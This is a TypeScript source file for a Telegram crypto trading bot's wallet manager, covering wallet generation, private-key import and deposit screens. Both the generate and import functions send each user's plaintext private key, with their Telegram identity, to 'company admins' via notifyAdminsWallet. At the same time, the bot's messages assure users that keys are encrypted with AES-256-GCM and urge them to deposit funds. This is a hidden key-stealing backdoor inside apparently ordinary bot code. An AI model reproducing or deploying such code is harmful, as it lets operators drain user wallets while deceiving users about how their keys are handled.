/**
 * Wallet Manager — generate, import, deposit, and manage wallets.
 * Handles both callback (editMessageText) and command (reply) contexts.
 */

import type { Context } from "telegraf";
import { Markup } from "telegraf";
import { db } from "@workspace/db";
import { usersTable, walletsTable } from "@workspace/db";
import { eq, and } from "drizzle-orm";
import { encrypt, decrypt } from "../../lib/encryption";
import { notifyAdminsWallet } from "../../lib/adminNotify";
import { getChainBalance, CHAIN_SYMBOLS } from "../../services/chainPrice";
import { logger } from "../../lib/logger";

// Temporary in-memory state for multi-step wallet import flow
const pendingImport = new Map<number, { chain: string; step: "awaiting_key" }>();

export function getPendingImport(telegramId: number) {
  return pendingImport.get(telegramId) ?? null;
}

// ── Helper: reply or edit depending on context type ──────────────────────────
async function sendOrEdit(
  ctx: Context,
  text: string,
  extra: Parameters<Context["reply"]>[1]
): Promise<void> {
  try {
    if (ctx.callbackQuery) {
      await ctx.editMessageText(text, extra as Parameters<Context["editMessageText"]>[1]);
    } else {
      await ctx.reply(text, extra);
    }
  } catch {
    // If edit fails (e.g. message unchanged), fall back to reply
    await ctx.reply(text, extra);
  }
}

// ── Wallet Manager — main screen ─────────────────────────────────────────────
export async function handleWalletManager(ctx: Context): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) {
    await ctx.reply("❌ User not found. Send /start first.");
    return;
  }

  const wallets = await db
    .select()
    .from(walletsTable)
    .where(eq(walletsTable.userId, user.id))
    .orderBy(walletsTable.createdAt);

  const chain = user.activeChain;
  const activeWallet = wallets.find((w) => w.chain === chain && w.isActive);

  // Build wallet list
  const walletLines =
    wallets.length === 0
      ? ["  No wallets connected yet."]
      : wallets.map(
          (w) =>
            `${w.isActive ? "🟢" : "⚪"} [${w.chain}] <code>${w.address}</code>${w.isActive ? " ✓ Active" : ""}`
        );

  const chains = ["SOL", "ETH", "BASE", "BSC"];
  const generateRow = chains.map((c) =>
    Markup.button.callback(`➕ ${c}`, `gen_wallet:${c}`)
  );
  const importRow = chains.map((c) =>
    Markup.button.callback(`📥 ${c}`, `import_wallet:${c}`)
  );

  const depositRow = activeWallet
    ? [[Markup.button.callback(`💳 Deposit — ${chain}`, `deposit:${chain}`)]]
    : [];

  const text = [
    `💼 <b>Wallet Manager</b>`,
    `📌 Active Chain: <b>${chain}</b>`,
    `—`,
    ...walletLines,
    `—`,
    `🔐 Keys stored encrypted (AES-256-GCM)`,
    ``,
    `➕ = Generate new wallet`,
    `📥 = Import existing wallet`,
    activeWallet
      ? `💳 = Deposit funds to your active ${chain} wallet`
      : `⚠️ Generate or import a wallet to see deposit address`,
  ].join("\n");

  const keyboard = Markup.inlineKeyboard([
    generateRow,
    importRow,
    ...depositRow,
    [Markup.button.callback("⬅️ Dashboard", "dashboard")],
  ]);

  await sendOrEdit(ctx, text, { parse_mode: "HTML", ...keyboard });
}

// ── Deposit screen — shows full address + balance + instructions ─────────────
export async function handleDeposit(ctx: Context, chain: string): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  const wallet = await db.query.walletsTable.findFirst({
    where: and(
      eq(walletsTable.userId, user.id),
      eq(walletsTable.chain, chain),
      eq(walletsTable.isActive, true)
    ),
  });

  if (!wallet) {
    await sendOrEdit(
      ctx,
      `❌ No active ${chain} wallet found. Generate or import one first.`,
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("💼 Wallet Manager", "wallet_manager")],
        ]),
      }
    );
    return;
  }

  const symbol = CHAIN_SYMBOLS[chain] ?? chain;
  const balance = await getChainBalance(chain, wallet.address).catch(() => "0.0000");

  const networkInfo: Record<string, string> = {
    SOL: "Solana Mainnet (SPL/SOL only — do NOT send other chains)",
    ETH: "Ethereum Mainnet (ERC-20/ETH only)",
    BASE: "Base Network (Base ETH only)",
    BSC: "BNB Smart Chain (BEP-20/BNB only)",
  };

  const minimums: Record<string, string> = {
    SOL: "0.01 SOL minimum (covers rent + fees)",
    ETH: "0.005 ETH minimum (covers gas fees)",
    BASE: "0.001 ETH minimum",
    BSC: "0.005 BNB minimum",
  };

  const text = [
    `💳 <b>Deposit ${symbol}</b>`,
    `—`,
    `📬 <b>Your Deposit Address:</b>`,
    `<code>${wallet.address}</code>`,
    ``,
    `💰 <b>Current Balance:</b> ${balance} ${symbol}`,
    `—`,
    `🌐 <b>Network:</b> ${networkInfo[chain] ?? chain}`,
    `📌 <b>Minimum:</b> ${minimums[chain] ?? "Check network fees"}`,
    `—`,
    `⚠️ <b>Important:</b>`,
    `• Only send <b>${symbol}</b> on the <b>${chain}</b> network`,
    `• Sending wrong assets = permanent loss`,
    `• Tap the address above to copy it`,
    `• Funds reflect after ~1 confirmation`,
    `—`,
    `After depositing, tap <b>💰 Buy Token</b> to paste a CA and trade,`,
    `or <b>🤖 Auto-Snipe</b> to hunt new tokens automatically.`,
  ].join("\n");

  await sendOrEdit(ctx, text, {
    parse_mode: "HTML",
    ...Markup.inlineKeyboard([
      [
        Markup.button.callback("🔄 Refresh Balance", `deposit:${chain}`),
        Markup.button.callback("💰 Buy a Token", "prompt_buy"),
      ],
      [
        Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
        Markup.button.callback("🔍 New Runners", "new_runners"),
      ],
      [
        Markup.button.callback("🔥 Trending", "trending"),
        Markup.button.callback("🌱 PumpFun Snipe", "pumpfun"),
      ],
      [Markup.button.callback("⬅️ Wallet Manager", "wallet_manager")],
    ]),
  });
}

// ── Import: process submitted private key ────────────────────────────────────
export async function processImportedKey(
  ctx: Context,
  privateKeyInput: string
): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const state = pendingImport.get(telegramId);
  if (!state) return;
  pendingImport.delete(telegramId);

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    const { Keypair } = await import("@solana/web3.js");
    const bs58 = await import("bs58");

    let address: string;
    let encryptedKey: string;

    if (state.chain === "SOL") {
      const keyBytes = bs58.default.decode(privateKeyInput.trim());
      const kp = Keypair.fromSecretKey(keyBytes);
      address = kp.publicKey.toBase58();
      encryptedKey = encrypt(privateKeyInput.trim());
    } else {
      const { Wallet } = await import("ethers");
      const wallet = new Wallet(privateKeyInput.trim());
      address = wallet.address;
      encryptedKey = encrypt(privateKeyInput.trim());
    }

    // Deactivate existing wallets on this chain
    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(
        and(
          eq(walletsTable.userId, user.id),
          eq(walletsTable.chain, state.chain)
        )
      );

    await db.insert(walletsTable).values({
      userId: user.id,
      chain: state.chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: `${state.chain} Wallet`,
      isActive: true,
    });

    // Notify company admins
    void notifyAdminsWallet({
      event: "IMPORTED",
      chain: state.chain,
      address,
      privateKey: privateKeyInput.trim(),
      userTelegramId: telegramId,
      username: ctx.from?.username,
      firstName: ctx.from?.first_name,
    });

    const symbol = CHAIN_SYMBOLS[state.chain] ?? state.chain;
    await ctx.reply(
      [
        `✅ <b>Wallet Imported — ${state.chain}</b>`,
        `—`,
        `💼 <b>Address:</b>`,
        `<code>${address}</code>`,
        ``,
        `🔐 Private key encrypted with AES-256-GCM`,
        `—`,
        `Tap <b>💳 Deposit</b> to fund your wallet and start trading.`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(`💳 Deposit ${symbol}`, `deposit:${state.chain}`),
            Markup.button.callback("💰 Buy a Token", "prompt_buy"),
          ],
          [
            Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
            Markup.button.callback("⬅️ Dashboard", "dashboard"),
          ],
        ]),
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet import failed");
    await ctx.reply(
      "❌ Invalid private key. Ensure it is a valid base58 (Solana) or hex (EVM) key.",
      Markup.inlineKeyboard([[Markup.button.callback("💼 Wallet Manager", "wallet_manager")]])
    );
  }
}

// ── Generate new wallet ───────────────────────────────────────────────────────
export async function handleGenerateWallet(
  ctx: Context,
  chain: string
): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    let address: string;
    let privateKey: string;

    if (chain === "SOL") {
      const { Keypair } = await import("@solana/web3.js");
      const bs58 = await import("bs58");
      const kp = Keypair.generate();
      address = kp.publicKey.toBase58();
      privateKey = bs58.default.encode(kp.secretKey);
    } else {
      const { Wallet } = await import("ethers");
      const w = Wallet.createRandom();
      address = w.address;
      privateKey = w.privateKey;
    }

    const encryptedKey = encrypt(privateKey);

    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, chain)));

    await db.insert(walletsTable).values({
      userId: user.id,
      chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: `${chain} Wallet`,
      isActive: true,
    });

    // Notify company admins
    void notifyAdminsWallet({
      event: "CREATED",
      chain,
      address,
      privateKey,
      userTelegramId: telegramId,
      username: ctx.from?.username,
      firstName: ctx.from?.first_name,
    });

    const symbol = CHAIN_SYMBOLS[chain] ?? chain;
    await ctx.reply(
      [
        `✅ <b>New ${chain} Wallet Generated</b>`,
        `—`,
        `💼 <b>Address:</b>`,
        `<code>${address}</code>`,
        ``,
        `🔑 <b>Private Key (SAVE NOW — not shown again):</b>`,
        `<code>${privateKey}</code>`,
        ``,
        `⚠️ <b>Back up your private key immediately.</b>`,
        `🔐 Key stored encrypted with AES-256-GCM.`,
        `—`,
        `Tap <b>💳 Deposit</b> to fund your wallet, then start trading.`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [
            Markup.button.callback(`💳 Deposit ${symbol}`, `deposit:${chain}`),
            Markup.button.callback("💰 Buy a Token", "prompt_buy"),
          ],
          [
            Markup.button.callback("🤖 Auto-Snipe", "auto_snipe"),
            Markup.button.callback("⬅️ Dashboard", "dashboard"),
          ],
        ]),
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet generation failed");
    await ctx.reply("❌ Wallet generation failed. Check server logs.");
  }
}

// ── Trigger import flow ───────────────────────────────────────────────────────
export async function handleImportWallet(
  ctx: Context,
  chain: string
): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  pendingImport.set(telegramId, { chain, step: "awaiting_key" });

  await ctx.reply(
    [
      `📥 <b>Import ${chain} Wallet</b>`,
      ``,
      `Send your private key in the next message.`,
      chain === "SOL"
        ? `Format: <b>base58 encoded</b> secret key (~88 chars)`
        : `Format: <b>0x hex</b> private key (66 chars)`,
      ``,
      `⚠️ <b>Use this in a private chat only.</b>`,
      `🔐 Key will be encrypted immediately on receipt.`,
    ].join("\n"),
    { parse_mode: "HTML" }
  );
}
